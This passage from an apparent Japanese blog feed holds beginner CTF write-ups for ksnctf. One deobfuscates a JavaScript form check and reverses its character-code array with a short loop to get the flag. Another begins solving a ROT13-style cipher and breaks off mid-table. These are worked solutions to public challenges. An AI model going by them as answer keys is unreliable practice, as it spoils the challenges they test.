+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳にゃー&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　入れてみるとなんだかバカなことをやっているんじゃないかと思えてきたのだが、なんと正解だったのだからもうどうにでもなれである。&lt;/p&gt;
+
+&lt;p&gt;　出力結果は以下である。&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　console.log が効いたので、変数という事で良さそうだ。というわけで片っ端から console.log で出力してみたところ、現れた。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(ᒧᆞωᆞ).ᒧうーｰｰｰー&lt;/code&gt; の中身は以下の &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;javascript&lt;/code&gt; であった。&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;input[type=&quot;text&quot;]&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;284&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;475&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;612&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;791&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;896&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;810&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;737&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1332&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1469&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1470&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1785&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2196&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1520&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1449&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;(」・ω・)」うー!(/・ω・)/にゃー!&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;No&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　良く良く見れば、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&lt;/code&gt; で JQuery を読み込んでいたわけで、ちゃんと使っていたわけである。ここまで来てもいろいろ信じられないことが多いのだが、とにかくここまで来た。&lt;/p&gt;
+
+&lt;p&gt;　フォームを押した時の挙動が記されており、配列pから生成した値と入力値が全文字で一致したら&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;うーにゃー&lt;/code&gt;のアラートを出してくれるらしい。&lt;/p&gt;
+
+&lt;p&gt;　おそらく、その入力値がフラグなのだろう。&lt;/p&gt;
+
+&lt;p&gt;　これでやることが明確になった。&lt;/p&gt;
+
+&lt;h3 id=&quot;解く&quot;&gt;解く&lt;/h3&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　入力した文字を一文字ずつ(t)に対して、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t.charCodeAt(i)*(i+1)&lt;/code&gt; の計算をした値が &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p[i]&lt;/code&gt; と一致すれば良い。&lt;/p&gt;
+
+&lt;p&gt;　従って、以下のように変形していける。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t.charCodeAt(i)*(i+1) == p[i]&lt;/code&gt; : 両辺を (i+1) で割る ↓&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t.charCodeAt(i) == p[i] / (i+1)&lt;/code&gt; : 両辺を charCode で割る（？）的な ↓&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t = String.fromCharCode(p[i] / (i+1))&lt;/code&gt; : 完成。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　即ち、p配列の要素全てに上記の計算を行った値を出力すれば謎が解けるはずである。&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;284&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;475&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;612&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;791&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;896&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;810&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;737&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1332&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1469&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1470&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;832&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1785&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2196&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1520&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1449&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`? = &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; / &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; : &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　出力結果は想定通りの結果だった。FLAGが出てきて、クリア。&lt;/p&gt;
+
+&lt;h2 id=&quot;所感&quot;&gt;所感&lt;/h2&gt;
+
+&lt;p&gt;　謎は解けたが、うーにゃーで &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;javascript&lt;/code&gt; と同等の機能になっているという謎は未だ分かっていない。調べようにも調べ方が分からない。&lt;/p&gt;
+
+&lt;p&gt;　この問題に含まれていた謎は、二つだろう。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;うーにゃーがjavascriptと同等の機能を実現していること&lt;/li&gt;
+  &lt;li&gt;逆算の仕方&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　2つ目は数式の変換だけでありそれほど苦ではなかったが、1つ目は一種の閃きに助けられた。&lt;/p&gt;
+
+&lt;p&gt;　規則性を見出す点は crypto に近かったから、web問らしさはないのかもしれない。&lt;/p&gt;
+
+&lt;p&gt;　web問というのはネットワークパケットを解析したりするのだろうか、さてわからない。&lt;/p&gt;
+
+&lt;p&gt;　ともかくこれで2問目だ。実質3問目ということで良いか。&lt;/p&gt;
+
+&lt;p&gt;　うーにゃーの謎を残したが、先へ進もうと思う。&lt;/p&gt;
+
+&lt;p&gt;　FLAGを取る感覚が随分と分かってきた気がする。この調子で次もぱぱっと解いてしまおう。いざ。&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 002 Easy Cipher</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/002.html" rel="alternate" type="text/html" title="ksnctf 002 Easy Cipher" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/002</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/002.html">&lt;h2 id=&quot;ksnctf-002-easy-cipher&quot;&gt;ksnctf 002 Easy Cipher&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;問題公開日: 2012/05/24&lt;/li&gt;
+  &lt;li&gt;ジャンル: crypto&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;謎解き&quot;&gt;謎解き&lt;/h3&gt;
+
+&lt;p&gt;　どうやら文章が書かれているのだが、読めるようになっていない。&lt;/p&gt;
+
+&lt;p&gt;　それでも規則性はあるようで、一定間隔で空白が存在する。&lt;/p&gt;
+
+&lt;p&gt;　使われている文字もアルファベットであることから、これは英語の文章と考えられる。&lt;/p&gt;
+
+&lt;p&gt;　英単語でかつ、一文字、二文字となれば、かなり絞れるだろうと考えてみると、&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;字数&lt;/th&gt;
+      &lt;th&gt;例&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;a, I&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;am, an, as, at, be, by, do, go, hi, id, if, is, it, me, my, of, on, or, so, to, up, we, …&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;　一文字はこれしかないだろう。ただ、二文字については考えてみると案外量がある。&lt;/p&gt;
+
+&lt;p&gt;　問題文に目を通すと、 一文字では &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; がある。文頭で使われていないことから、 I ではなく &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; と考えられる。&lt;/p&gt;
+
+&lt;p&gt;　二文字については、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vg&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;va&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;na&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bs&lt;/code&gt; がある。&lt;/p&gt;
+
+&lt;p&gt;　正直言って確定は難しい。&lt;/p&gt;
+
+&lt;p&gt;　そこで、文章のまとまりで見てみると、閃いた。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EBG KVVV vf n fvzcyr&lt;/code&gt; が文頭にあるが、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;〇〇 is a △△&lt;/code&gt; と書かれているような気がしてくる。仮置きでこれを正解とすれば、以下のようになる。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;前&lt;/th&gt;
+      &lt;th&gt;後&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
